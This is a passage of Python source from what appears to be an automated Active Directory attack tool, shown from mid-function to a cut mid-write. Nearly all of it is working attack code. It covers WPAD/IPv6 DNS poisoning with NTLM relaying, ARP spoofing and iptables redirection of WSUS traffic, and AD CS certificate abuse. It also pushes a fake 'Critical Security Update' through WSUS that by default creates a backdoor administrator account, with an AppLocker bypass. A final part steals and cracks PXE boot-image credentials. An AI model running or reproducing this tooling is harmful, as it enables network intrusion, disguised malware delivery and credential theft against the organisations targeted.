        for ip in sorted(results["dhcpv6"]):
            detail(ip)
        found_anything = True

    if results["wsus"]:
        ok(f"📦 WSUS traffic from {len(results['wsus'])} host(s) — WSUS relay viable")
        for ip in sorted(results["wsus"]):
            detail(ip)
        found_anything = True

    if results["nbtns"]:
        ok(f"📡 NBT-NS WPAD queries from {len(results['nbtns'])} host(s)")
        for ip in sorted(results["nbtns"]):
            detail(ip)
        found_anything = True

    if results["pxe"]:
        ok(f"🖥️  PXE boot traffic from {len(results['pxe'])} host(s) — PXE credential theft viable")
        for ip in sorted(results["pxe"]):
            detail(ip)
        found_anything = True

    if results["tftp"]:
        ok(f"📂 TFTP traffic from {len(results['tftp'])} host(s) — unauthenticated file transfers")
        for ip in sorted(results["tftp"]):
            detail(ip)
        found_anything = True

    if results["domains"]:
        ok(f"🏢 Domain name(s) detected in traffic:")
        for dom in sorted(results["domains"]):
            detail(dom)
        found_anything = True
        # Auto-set domain if not already specified
        if not cfg.domain:
            # Prefer domains with common AD TLDs
            best_domain = ""
            for dom in sorted(results["domains"]):
                if dom.endswith((".local", ".internal", ".corp", ".lan", ".ad")):
                    best_domain = dom
                    break
            if not best_domain:
                best_domain = sorted(results["domains"])[0]
            cfg.domain = best_domain
            ok(f"Auto-detected domain from traffic: {cfg.domain}")

    if not found_anything:
        log.warning(f"No WPAD/WSUS/PXE/LLMNR/DHCPv6 traffic detected in {duration}s")
        log.warning("This doesn't mean attacks won't work — clients may not have queried yet")

    # Save results
    discovery_file = cfg.work_dir / "passive-discovery.txt"
    lines = []
    for key, ips in results.items():
        if ips:
            lines.append(f"[{key}]")
            for ip in sorted(ips):
                lines.append(f"  {ip}")
    if lines:
        discovery_file.write_text("\n".join(lines) + "\n")
        detail(f"Results saved to {discovery_file}")

    return {k: list(v) for k, v in results.items()}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 4: WPAD Poisoning (mitm6 / Responder)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_wsus_server(cfg: Config) -> str:
    """Try to discover WSUS server on the network via LDAP GPO or port scan."""
    if cfg.wsus_server:
        return cfg.wsus_server

    # Scan common WSUS ports on the subnet
    log.info("🔍 Scanning for WSUS servers (ports 8530/8531)...")
    if not tool_exists("nmap"):
        log.warning("nmap not available for WSUS discovery")
        return ""

    target = cfg.specific_target or cfg.target_net or cfg.dc_ip
    if not target:
        return ""

    result = run(
        ["nmap", "-sT", "-n", "-Pn", "--open", "-p", "8530,8531", target],
        cfg, timeout=120
    )
    hosts = re.findall(
        r"Nmap scan report for (\d+\.\d+\.\d+\.\d+).*?(?:8530|8531)/tcp\s+open",
        result.stdout, re.DOTALL
    )
    if hosts:
        wsus = hosts[0]
        ok(f"WSUS server found: {wsus}")
        cfg.wsus_server = wsus
        return wsus

    log.warning("No WSUS server detected on network")
    return ""


def run_wpad_attack(cfg: Config) -> bool:
    """Run WPAD poisoning via mitm6 or Responder + ntlmrelayx relay.

    mitm6 poisons IPv6 DNS → victims resolve WPAD to attacker →
    ntlmrelayx serves WPAD proxy auth → captures/relays NTLM.
    """
    phase_header("PHASE 4: WPAD POISONING")

    relay_target = cfg.specific_target or f"ldaps://{cfg.dc_ip}" if cfg.dc_ip else ""
    if not relay_target:
        log.error("No relay target — need --target or --dc-ip for WPAD relay")
        return False

    iface = cfg.iface or "eth0"
    relay_output = cfg.work_dir / "wpad-relay.txt"
    hash_output = cfg.work_dir / "wpad-hashes"
    bg_procs = []

    use_mitm6 = tool_exists("mitm6")
    use_responder = tool_exists("responder")

    if not use_mitm6 and not use_responder:
        log.error("Need mitm6 or responder for WPAD attack")
        log.warning("Install: pipx install mitm6  OR  apt install responder")
        return False

    try:
        # Start ntlmrelayx with WPAD hosting
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", relay_target,
            "-smb2support",
            "-of", str(hash_output),
            "--no-smb-server",
        ]

        if cfg.dc_ip and relay_target.startswith("ldap"):
            relay_cmd += ["-wh", f"wpad.{cfg.domain}"]
            if not cfg.no_shadow_creds:
                relay_cmd += ["--shadow-credentials"]
            elif not cfg.no_rbcd:
                relay_cmd += ["--delegate-access"]
        else:
            relay_cmd += ["-wh", f"wpad.{cfg.domain}"]

        if cfg.use_socks:
            relay_cmd += ["-socks"]

        # AppLocker-aware command execution
        if cfg.applocker and cfg.custom_cmd:
            relay_cmd += ["--execute-cmd", _build_applocker_cmd(cfg)]
        elif cfg.custom_cmd:
            relay_cmd += ["--execute-cmd", cfg.custom_cmd]

        relay_cmd += ["-6"]  # Listen on IPv4 and IPv6

        log.info("🎣 Starting ntlmrelayx with WPAD hosting...")
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx for WPAD relay")
            return False
        bg_procs.append(relay_proc)
        time.sleep(3)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
            return False

        # Start poisoning
        if use_mitm6 and cfg.domain:
            log.info(f"🌐 Starting mitm6 IPv6 DNS poisoning for {cfg.domain}...")
            mitm6_cmd = ["mitm6", "-d", cfg.domain, "-i", iface]
            mitm6_proc = run(
                mitm6_cmd, cfg, bg=True,
                outfile=cfg.work_dir / "mitm6.txt"
            )
            if hasattr(mitm6_proc, 'poll'):
                bg_procs.append(mitm6_proc)
        elif use_responder:
            log.info(f"📡 Starting Responder WPAD poisoning on {iface}...")
            resp_cmd = ["responder", "-I", iface, "-wPv"]
            resp_proc = run(
                resp_cmd, cfg, bg=True,
                outfile=cfg.work_dir / "responder-wpad.txt"
            )
            if hasattr(resp_proc, 'poll'):
                bg_procs.append(resp_proc)

        ok("WPAD poisoning + relay running, waiting for victims...")
        max_wait = cfg.poison_duration
        waited = 0
        captured = False
        while waited < max_wait:
            if relay_output.exists():
                content = relay_output.read_text()
                if re.search(r"authenticated|SUCCEED|hash|delegate|computer.*account",
                             content, re.IGNORECASE):
                    ok("🎣 Captured NTLM authentication via WPAD!")
                    captured = True
                    break
            time.sleep(5)
            waited += 5
            if waited % 30 == 0:
                log.info(f"⏳ WPAD poisoning active... ({waited}/{max_wait}s)")

        # Extract any captured hashes
        extract_hashes(cfg)

        if captured:
            success_box("WPAD poisoning captured authentication")
            return True
        else:
            log.warning(f"No WPAD authentication captured within {max_wait}s")
            log.warning("Clients may need to trigger WPAD (e.g., open browser, Windows Update)")
            return False

    finally:
        log.info("🛑 Stopping WPAD poisoning...")
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 5: WSUS Exploitation
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _acquire_wsus_cert(wsus_server: str, cfg: Config) -> tuple[str, str] | None:
    """Abuse AD CS to get a certificate trusted by WSUS clients.

    Per TrustedSec research: find a template with "Enrollee Supplies Subject"
    enabled, request a cert with the WSUS server's FQDN as SAN, extract
    PEM cert + key for ntlmrelayx HTTPS interception.
    """
    if not tool_exists("certipy"):
        return None

    cert_dir = cfg.work_dir / "wsus-cert"
    cert_dir.mkdir(exist_ok=True)

    template = ""
    ca_name = ""

    # Step 1a: Try Certihound first (ESC1 implies Enrollee Supplies Subject)
    ch_result = _certihound_find(cfg)
    if ch_result:
        for esc, tmpl in ch_result["vulns"]:
            if esc == "ESC1" and tmpl and tmpl != "unknown":
                template = tmpl
                break
        ca_name = ch_result["ca_name"]

    # Step 1b: Fallback to certipy find if Certihound missed it
    if not template or not ca_name:
        log.info("🔍 Enumerating AD CS templates with certipy...")
        find_result = run(
            ["certipy", "find", "-u", f"{cfg.username}@{cfg.domain}",
             "-p", cfg.password, "-dc-ip", cfg.dc_ip, "-enabled",
             "-stdout"],
            cfg, timeout=120
        )

        if find_result.returncode != 0:
            log.warning("certipy enumeration failed")
            return None

        if "Enrollee Supplies Subject" not in find_result.stdout:
            log.warning("No vulnerable AD CS templates found (need 'Enrollee Supplies Subject')")
            return None

        if not template:
            template_match = re.search(
                r"Template Name\s*:\s*(\S+).*?Enrollee Supplies Subject\s*:\s*True",
                find_result.stdout, re.DOTALL
            )
            if not template_match:
                log.warning("Could not parse vulnerable template name from certipy output")
                return None
            template = template_match.group(1)

        if not ca_name:
            ca_match = re.search(r"CA Name\s*:\s*(.+)", find_result.stdout)
            ca_name = ca_match.group(1).strip() if ca_match else ""

    ok(f"Found vulnerable template: {template}")
    if not ca_name:
        log.warning("Could not determine CA name")
        return None

    # Resolve WSUS FQDN
    wsus_fqdn = wsus_server
    if not "." in wsus_fqdn and cfg.domain:
        wsus_fqdn = f"{wsus_server}.{cfg.domain}"

    # Step 2: Request certificate with WSUS server SAN
    pfx_path = cert_dir / "wsus.pfx"
    log.info(f"📜 Requesting certificate for {wsus_fqdn} via template '{template}'...")
    req_result = run(
        ["certipy", "req",
         "-u", f"{cfg.username}@{cfg.domain}",
         "-p", cfg.password,
         "-ca", ca_name,
         "-template", template,
         "-subject", f"CN={wsus_fqdn}",
         "-dns", wsus_fqdn,
         "-out", str(pfx_path),
         "-dc-ip", cfg.dc_ip],
        cfg, timeout=60
    )

    if req_result.returncode != 0 or not pfx_path.exists():
        log.warning("Certificate request failed")
        return None

    # Step 3: Extract cert and key from PFX
    cert_path = cert_dir / "wsus.crt"
    key_path = cert_dir / "wsus.key"

    run(["openssl", "pkcs12", "-in", str(pfx_path), "-clcerts", "-nokeys",
         "-out", str(cert_path), "-passin", "pass:"], cfg, timeout=10)
    run(["openssl", "pkcs12", "-in", str(pfx_path), "-nocerts", "-nodes",
         "-out", str(key_path), "-passin", "pass:"], cfg, timeout=10)

    if cert_path.exists() and key_path.exists():
        ok(f"Extracted cert: {cert_path}")
        ok(f"Extracted key: {key_path}")
        return str(cert_path), str(key_path)

    log.warning("Failed to extract cert/key from PFX")
    return None


def run_wsus_relay(cfg: Config) -> bool:
    """Intercept WSUS client traffic via ARP spoof + ntlmrelayx on port 8530/8531.

    Based on TrustedSec research: ARP spoof → redirect WSUS HTTP traffic →
    ntlmrelayx captures machine account NTLM → relay to LDAP/SMB.
    """
    phase_header("PHASE 5a: WSUS NTLM RELAY")

    wsus_server = detect_wsus_server(cfg)
    if not wsus_server:
        log.warning("No WSUS server found — skipping WSUS relay")
        return False

    port = cfg.wsus_port or (WSUS_HTTPS_PORT if cfg.wsus_https else WSUS_HTTP_PORT)
    relay_target = cfg.specific_target or f"ldap://{cfg.dc_ip}" if cfg.dc_ip else ""
    if not relay_target:
        log.error("Need --target or --dc-ip for WSUS relay")
        return False

    iface = cfg.iface or "eth0"
    relay_output = cfg.work_dir / "wsus-relay.txt"
    hash_output = cfg.work_dir / "wsus-hashes"
    bg_procs = []

    spoof_tool = find_tool("arpspoof", "bettercap")
    if not spoof_tool:
        log.error("Need arpspoof or bettercap for WSUS relay")
        return False

    # Auto-acquire certificate for HTTPS interception via AD CS abuse
    if cfg.wsus_https and not cfg.wsus_certfile and cfg.has_creds and tool_exists("certipy"):
        log.info("🔐 Attempting AD CS certificate abuse for WSUS HTTPS interception...")
        cert_result = _acquire_wsus_cert(wsus_server, cfg)
        if cert_result:
            cfg.wsus_certfile, cfg.wsus_keyfile = cert_result
            ok(f"Certificate acquired: {cfg.wsus_certfile}")
        else:
            log.warning("Could not auto-acquire certificate — HTTPS relay may fail")

    # Enable IP forwarding
    old_forward = "0"
    try:
        old_forward = Path("/proc/sys/net/ipv4/ip_forward").read_text().strip()
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1")
    except OSError as e:
        log.error(f"Cannot enable IP forwarding: {e}")
        return False

    try:
        # Set up iptables redirect for WSUS port
        log.info(f"🔀 Redirecting port {port} traffic via iptables...")
        run(["iptables", "-t", "nat", "-A", "PREROUTING",
             "-p", "tcp", "--dport", str(port), "-j", "REDIRECT",
             "--to-ports", str(port)], cfg, timeout=10)

        # Start ntlmrelayx on the WSUS port
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", relay_target,
            "-smb2support",
            "-of", str(hash_output),
            "--http-port", str(port),
            "--keep-relaying",
            "-socks",
        ]

        if cfg.wsus_https and cfg.wsus_certfile and cfg.wsus_keyfile:
            relay_cmd += [
                "--https",
                "--certfile", cfg.wsus_certfile,
                "--keyfile", cfg.wsus_keyfile,
            ]

        log.info(f"🎣 Starting ntlmrelayx on port {port} for WSUS relay...")
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx for WSUS relay")
            return False
        bg_procs.append(relay_proc)
        time.sleep(2)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
            return False

        # ARP spoof WSUS clients → attacker (so their WSUS traffic hits us)
        # We need to discover which hosts are talking to the WSUS server
        live_hosts = discover_live_hosts(cfg) if not cfg.specific_target else [cfg.specific_target]

        for target in live_hosts[:5]:  # Limit to first 5 hosts
            if target == wsus_server or target == cfg.attacker_ip:
                continue
            log.info(f"🔀 ARP spoof: {target} ↔ {wsus_server}")
            if "bettercap" in spoof_tool:
                bp = run(
                    ["bettercap", "-iface", iface, "-eval",
                     f"set arp.spoof.targets {target}; set arp.spoof.internal true; arp.spoof on"],
                    cfg, bg=True, outfile=cfg.work_dir / f"wsus-arp-{target}.txt"
                )
                if hasattr(bp, 'poll'):
                    bg_procs.append(bp)
            else:
                p1 = run(
                    ["arpspoof", "-i", iface, "-t", target, wsus_server],
                    cfg, bg=True, outfile=cfg.work_dir / f"wsus-arp-{target}-1.txt"
                )
                p2 = run(
                    ["arpspoof", "-i", iface, "-t", wsus_server, target],
                    cfg, bg=True, outfile=cfg.work_dir / f"wsus-arp-{target}-2.txt"
                )
                for p in [p1, p2]:
                    if hasattr(p, 'poll'):
                        bg_procs.append(p)

        ok(f"WSUS relay active on port {port}, spoofing {len(live_hosts)} client(s)...")
        log.info("💡 Tip: Trigger client check-in remotely: wuauclt.exe /detectnow")

        max_wait = cfg.poison_duration * 2  # WSUS needs longer (check-in intervals)
        waited = 0
        captured = False
        while waited < max_wait:
            if relay_output.exists():
                content = relay_output.read_text()
                if re.search(r"authenticated|SUCCEED|machine.*account|\$::",
                             content, re.IGNORECASE):
                    ok("🎣 Captured WSUS machine account NTLM!")
                    captured = True
                    break
            time.sleep(5)
            waited += 5
            if waited % 60 == 0:
                log.info(f"⏳ WSUS relay listening... ({waited}/{max_wait}s)")

        extract_hashes(cfg)

        if captured:
            success_box("WSUS relay captured machine account authentication")
        else:
            log.warning(f"No WSUS auth captured within {max_wait}s")
            log.warning("WSUS clients check in every 22h by default; consider --poison-duration 86400")

        return captured

    finally:
        log.info("🛑 Stopping WSUS relay...")
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)

        # Clean up iptables rules
        log.info("🧹 Removing iptables redirect rules...")
        run(["iptables", "-t", "nat", "-D", "PREROUTING",
             "-p", "tcp", "--dport", str(port), "-j", "REDIRECT",
             "--to-ports", str(port)], cfg, timeout=10)

        # Restore IP forwarding
        try:
            Path("/proc/sys/net/ipv4/ip_forward").write_text(old_forward)
        except Exception:
            pass


def run_wsus_inject(cfg: Config) -> bool:
    """Push a malicious update via WSUS using wsuks.

    If AppLocker is active, uses Microsoft-signed PsExec as the update payload
    to bypass execution restrictions. Updates run as SYSTEM from a trusted path.
    """
    phase_header("PHASE 5b: WSUS UPDATE INJECTION")

    if not tool_exists("wsuks"):
        log.error("wsuks not found (pipx install wsuks --system-site-packages)")
        return False

    wsus_server = cfg.wsus_server or detect_wsus_server(cfg)
    if not wsus_server:
        log.error("No WSUS server specified or found — need --wsus-server")
        return False

    port = cfg.wsus_port or (WSUS_HTTPS_PORT if cfg.wsus_https else WSUS_HTTP_PORT)

    # Determine payload command
    if cfg.custom_cmd:
        payload_cmd = cfg.custom_cmd
    else:
        payload_cmd = f"cmd.exe /c net user /add hax0r P@ssw0rd123! && net localgroup administrators hax0r /add"
        log.warning(f"No --custom-cmd specified, using default: {payload_cmd}")

    # If AppLocker mode, wrap command for bypass
    if cfg.applocker:
        payload_cmd = _build_applocker_cmd(cfg, fallback_cmd=payload_cmd)

    # Find PsExec for signed-binary delivery (bypasses AppLocker)
    psexec_path = None
    for candidate in [
        TOOLS_DIR / "misc_files" / "SysinternalsSuite" / "PsExec64.exe",
        TOOLS_DIR / "misc_files" / "PsExec64.exe",
        Path("/usr/share/windows-resources/binaries/PsExec64.exe"),
    ]:
        if candidate.exists():
            psexec_path = str(candidate)
            break

    output_file = cfg.work_dir / "wsus-inject.txt"

    if psexec_path and cfg.applocker:
        # Use PsExec as the signed binary payload — bypasses AppLocker
        log.info("🔑 Using Microsoft-signed PsExec for AppLocker bypass via WSUS...")
        inject_cmd = [
            "wsuks",
            "--server", wsus_server,
            "--port", str(port),
            "--action", "inject",
            "--executable", psexec_path,
            "--args", f"-accepteula -s -d {payload_cmd}",
            "--title", "Critical Security Update KB5099999",
            "--approve-all",
        ]
    else:
        # Direct injection
        log.info("📦 Injecting malicious WSUS update...")
        inject_cmd = [
            "wsuks",
            "--server", wsus_server,
            "--port", str(port),
            "--action", "inject",
            "--executable", payload_cmd.split()[0] if " " in payload_cmd else "cmd.exe",
            "--args", payload_cmd if " " not in payload_cmd else " ".join(payload_cmd.split()[1:]),
            "--title", "Critical Security Update KB5099999",
            "--approve-all",
        ]

    if cfg.wsus_https:
        inject_cmd += ["--https"]

    result = run(inject_cmd, cfg, timeout=120, outfile=output_file)

    if result.returncode == 0:
        success_box("WSUS update injected successfully")
        ok("Clients will execute payload on next update check")
        detail("Force check-in: wuauclt.exe /detectnow  OR  UsoClient.exe StartScan")
        if cfg.applocker:
            ok("AppLocker bypass: payload delivered via trusted WSUS channel as SYSTEM")
        return True
    else:
        log.error("WSUS injection failed")
        if output_file.exists():
            log.error(output_file.read_text()[-500:])
        return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 6: PXE Boot Image Credential Theft
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_pxe_server(cfg: Config) -> str:
    """Discover PXE/WDS server via nmap scan for TFTP (port 69) and WDS (UDP 4011)."""
    log.info("🔍 Scanning for PXE/WDS servers (TFTP port 69, WDS port 4011)...")

    if not tool_exists("nmap"):
        log.warning("nmap not available for PXE discovery")
        return ""

    target = cfg.specific_target or cfg.target_net or cfg.dc_ip
    if not target:
        return ""

    result = run(
        ["nmap", "-sU", "-n", "-Pn", "--open", "-p", "69,4011", target],
        cfg, timeout=120
    )
    hosts = re.findall(
        r"Nmap scan report for (\d+\.\d+\.\d+\.\d+).*?(?:69|4011)/udp\s+open",
        result.stdout, re.DOTALL
    )
    if hosts:
        pxe = hosts[0]
        ok(f"PXE/TFTP server found: {pxe}")
        return pxe

    log.warning("No PXE/TFTP server detected on network")
    return ""


def run_pxe_attack(cfg: Config) -> bool:
    """Exploit PXE boot environment to extract credentials.

    Attack chain:
    1. Discover PXE server (DHCP broadcast or nmap)
    2. Use pxethiefy to download media variables via TFTP (zero-auth)
    3. Attempt blank-password decryption
    4. If password-protected, generate hashcat hash for offline cracking
    5. Extract Bootstrap.ini, Unattend.xml, VARIABLES.DAT from WIM images
    6. Parse credentials (deployment share creds, domain join creds)
    """
    phase_header("PHASE 6: PXE BOOT CREDENTIAL THEFT")

    iface = cfg.iface or "eth0"
    pxe_dir = cfg.work_dir / "pxe-loot"
    pxe_dir.mkdir(exist_ok=True)

    # Find PXE server
    pxe_server = ""

    # Method 1: Use pxethiefy DHCP broadcast discovery
    pxethiefy_path = find_tool(
        "pxethiefy",
        paths=[
            TOOLS_DIR / "pxethiefy" / "pxethiefy.py",
            TOOLS_DIR / "pxethiefy" / "pxethiefy" / "pxethiefy.py",
        ]
    )

    if pxethiefy_path:
        log.info("🖥️  Using pxethiefy to discover PXE servers via DHCP broadcast...")
        pxe_output = pxe_dir / "pxethiefy-explore.txt"
        result = run(
            pxethiefy_path.split() + ["explore", "-i", iface],
            cfg, timeout=90, outfile=pxe_output
        )

        if pxe_output.exists():
            content = pxe_output.read_text()

            # Check for downloaded media files
            media_files = re.findall(r"Downloaded[:\s]+(\S+\.boot\.var\S*)", content, re.IGNORECASE)
            if not media_files:
                media_files = list(pxe_dir.glob("*.boot.var")) + list(Path(".").glob("*.boot.var"))

            # Check for blank password auto-decrypt
            if re.search(r"blank.*password|no.*password|decrypt.*success", content, re.IGNORECASE):
                ok("🔓 PXE media has NO password — credentials auto-extracted!")
                _parse_pxe_credentials(content, cfg)
                return True

            # Check for hashcat hash (password-protected)
            hashcat_match = re.search(r"(\$sccm\$aes128\$[a-fA-F0-9]+)", content)
            if hashcat_match:
                pxe_hash = hashcat_match.group(1)
                hashfile = pxe_dir / "pxe-hashcat.txt"
                hashfile.write_text(pxe_hash + "\n")
                ok(f"🔐 PXE media is password-protected — hashcat hash saved")
                detail(f"Hash: {pxe_hash[:60]}...")
                detail(f"Crack: hashcat -m 28800 {hashfile} rockyou.txt")

                # Attempt quick crack
                cracked = _try_crack_pxe_hash(hashfile, cfg)
                if cracked and media_files:
                    log.info(f"🔓 Password cracked: {cracked}")
                    media_file = str(media_files[0])
                    decrypt_result = run(
                        pxethiefy_path.split() + ["decrypt", "-p", cracked, "-f", media_file],
                        cfg, timeout=30, outfile=pxe_dir / "pxethiefy-decrypt.txt"
                    )
                    if decrypt_result.returncode == 0:
                        _parse_pxe_credentials(
                            (pxe_dir / "pxethiefy-decrypt.txt").read_text(), cfg
                        )
                        return True
                return False  # Hash saved for offline cracking

            # Check for Management Point / SharpSCCM output
            if re.search(r"ManagementPoint|SMSTSMP|SharpSCCM", content):
                ok("📋 SCCM Management Point info extracted from PXE")
                _parse_pxe_credentials(content, cfg)
                return True

        pxe_server_match = re.search(r"PXE.*?server[:\s]+(\d+\.\d+\.\d+\.\d+)",
                                     pxe_output.read_text() if pxe_output.exists() else "",
                                     re.IGNORECASE)
        if pxe_server_match:
            pxe_server = pxe_server_match.group(1)
    else:
        log.warning("pxethiefy not found — falling back to manual TFTP extraction")

    # Method 2: Manual TFTP extraction (works without pxethiefy)
    if not pxe_server:
        pxe_server = detect_pxe_server(cfg)

    if not pxe_server:
        log.warning("No PXE server found — skipping PXE attack")
        return False

    log.info(f"📂 Attempting manual TFTP file extraction from {pxe_server}...")
    return _manual_tftp_extract(pxe_server, pxe_dir, cfg)


def _manual_tftp_extract(pxe_server: str, pxe_dir: Path, cfg: Config) -> bool:
    """Download and inspect PXE boot files via TFTP (zero authentication).

    Downloads BCD, WIM files, then mounts WIM to extract:
    - Bootstrap.ini (deployment share + creds)
    - Unattend.xml (installation config + potential creds)
    - VARIABLES.DAT (base64-encoded creds)
    """
    got_creds = False

    # Common PXE files to attempt downloading via TFTP
    tftp_files = [
        r"\boot\BCD",
        r"\boot\boot.sdi",
        r"\boot\x64\images\boot.wim",
        r"\boot\x86\images\boot.wim",
        r"\tmp\boot.wim",
        r"\Deploy\Bootstrap.ini",
        r"\SMS\data\variables.dat",
    ]

    if not tool_exists("tftp") and not tool_exists("atftp"):
        log.warning("No TFTP client found (apt install tftp or atftp)")
        return False

    tftp_cmd = "atftp" if tool_exists("atftp") else "tftp"

    for remote_path in tftp_files:
        local_name = remote_path.replace("\\", "_").lstrip("_")
        local_path = pxe_dir / local_name

        log.info(f"  📥 TFTP GET: {remote_path}")
        if tftp_cmd == "atftp":
            result = run(
                ["atftp", "--get", "--remote-file", remote_path,
                 "--local-file", str(local_path), pxe_server],
                cfg, timeout=60
            )
        else:
            result = run(
                ["tftp", pxe_server, "-c", "get", remote_path, str(local_path)],
                cfg, timeout=60
            )

        if local_path.exists() and local_path.stat().st_size > 0:
            ok(f"Downloaded: {local_name} ({local_path.stat().st_size} bytes)")

    # Parse any downloaded Bootstrap.ini directly
    for f in pxe_dir.glob("*Bootstrap*"):
        content = f.read_text(errors="ignore")
        creds = _parse_bootstrap_ini(content, cfg)
        if creds:
            got_creds = True

    # Mount and inspect WIM files
    for wim_file in pxe_dir.glob("*.wim"):
        creds = _extract_from_wim(wim_file, pxe_dir, cfg)
        if creds:
            got_creds = True

    # Check VARIABLES.DAT for base64-encoded credentials
    for dat_file in pxe_dir.glob("*variables*"):
        creds = _parse_variables_dat(dat_file, cfg)
        if creds:
            got_creds = True

    if got_creds:
        success_box("PXE credential extraction successful")
    else:
        log.warning("No credentials found in PXE files (images may require further analysis)")
        log.warning(f"Downloaded files saved in: {pxe_dir}")

    return got_creds


def _extract_from_wim(wim_file: Path, pxe_dir: Path, cfg: Config) -> bool:
    """Mount a WIM file and extract credentials from Bootstrap.ini, Unattend.xml, VARIABLES.DAT."""
    mount_dir = pxe_dir / f"wim-mount-{wim_file.stem}"
    mount_dir.mkdir(exist_ok=True)
    got_creds = False

    if not tool_exists("wimlib-imagex") and not tool_exists("wimmountrw"):
        log.warning("wimtools not found — cannot mount WIM (apt install wimtools)")
        return False

    try:
        log.info(f"📦 Mounting WIM: {wim_file.name}...")

        # Try wimlib-imagex first (more widely available)
        if tool_exists("wimlib-imagex"):
            result = run(
                ["wimlib-imagex", "apply", str(wim_file), "1", str(mount_dir)],
                cfg, timeout=300
            )
        else:
            result = run(
                ["wimmountrw", str(wim_file), str(mount_dir)],
                cfg, timeout=120
            )

        if result.returncode != 0:
            log.warning(f"Failed to mount/extract WIM: {wim_file.name}")
            return False

        ok(f"WIM extracted to {mount_dir}")

        # Search for credential files
        for pattern, parser in [
            ("**/Bootstrap.ini", _parse_bootstrap_ini),
            ("**/bootstrap.ini", _parse_bootstrap_ini),
            ("**/Unattend.xml", _parse_unattend_xml),
            ("**/unattend.xml", _parse_unattend_xml),
            ("**/Autounattend.xml", _parse_unattend_xml),
        ]:
            for found_file in mount_dir.glob(pattern):
                log.info(f"  🔍 Found: {found_file.relative_to(mount_dir)}")
                content = found_file.read_text(errors="ignore")
                if parser(content, cfg):
                    got_creds = True

        # Search for VARIABLES.DAT
        for dat_file in mount_dir.glob("**/VARIABLES.DAT"):
            log.info(f"  🔍 Found: {dat_file.relative_to(mount_dir)}")
            if _parse_variables_dat(dat_file, cfg):
                got_creds = True

        # Search for other interesting files
        for interesting in mount_dir.glob("**/*.ini"):
            content = interesting.read_text(errors="ignore")
            if re.search(r"password|passwd|credential|secret", content, re.IGNORECASE):
                log.info(f"  🔑 Potential credentials in: {interesting.relative_to(mount_dir)}")
                # Copy to loot directory
                loot_file = pxe_dir / f"loot-{interesting.name}"
                loot_file.write_text(content)

    finally:
        # Cleanup mount
        if tool_exists("wimlib-imagex"):
            pass  # apply mode extracts files, no unmount needed
        elif tool_exists("wimumount"):
            run(["wimumount", str(mount_dir)], cfg, timeout=30)

    return got_creds


def _parse_bootstrap_ini(content: str, cfg: Config) -> bool:
    """Parse Bootstrap.ini for deployment share credentials."""
    creds_found = False

    user_match = re.search(r"UserID=(\S+)", content, re.IGNORECASE)
    pass_match = re.search(r"UserPassword=(\S+)", content, re.IGNORECASE)
    domain_match = re.search(r"UserDomain=(\S+)", content, re.IGNORECASE)
    share_match = re.search(r"DeployRoot=(\S+)", content, re.IGNORECASE)

    if user_match:
        user = user_match.group(1)
        password = pass_match.group(1) if pass_match else ""
        domain = domain_match.group(1) if domain_match else ""
        share = share_match.group(1) if share_match else ""

        ok(f"🔑 PXE Bootstrap.ini credentials found!")
        detail(f"User: {domain}\\{user}")
        if password:
            detail(f"Password: {password}")
        if share:
            detail(f"Deployment share: {share}")

        # Save to loot file
        loot = cfg.work_dir / "pxe-creds.txt"
        with open(loot, "a") as f:
            f.write(f"[Bootstrap.ini]\n")
            f.write(f"User: {domain}\\{user}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Share: {share}\n\n")

        # Set as active credentials if we don't have any
        if password and not cfg.has_creds:
            cfg.username = user
            cfg.password = password
            if domain:
                cfg.domain = domain
            ok("🔑 PXE credentials set as active credentials for attack chain")

        creds_found = True

    return creds_found


def _parse_unattend_xml(content: str, cfg: Config) -> bool:
    """Parse Unattend.xml / Autounattend.xml for credentials."""
    creds_found = False

    # Look for plaintext passwords in various XML elements
    patterns = [
        (r"<Password>\s*<Value>([^<]+)</Value>", "Unattend password"),
        (r"<AdministratorPassword>\s*<Value>([^<]+)</Value>", "Admin password"),
        (r"<Username>([^<]+)</Username>.*?<Password>\s*<Value>([^<]+)</Value>",
         "Domain join creds"),
        (r"RunSynchronousCommand.*?<Path>[^<]*net use[^<]*(/user:\S+\s+\S+)", "Net use creds"),
    ]

    for pattern, desc in patterns:
        for match in re.finditer(pattern, content, re.DOTALL | re.IGNORECASE):
            value = match.group(1)
            # Skip base64 "true" markers
            if value.lower() in ("true", "false"):
                continue

            ok(f"🔑 {desc} found in Unattend.xml")
            detail(f"Value: {value}")

            loot = cfg.work_dir / "pxe-creds.txt"
            with open(loot, "a") as f:
                f.write(f"[Unattend.xml - {desc}]\n")
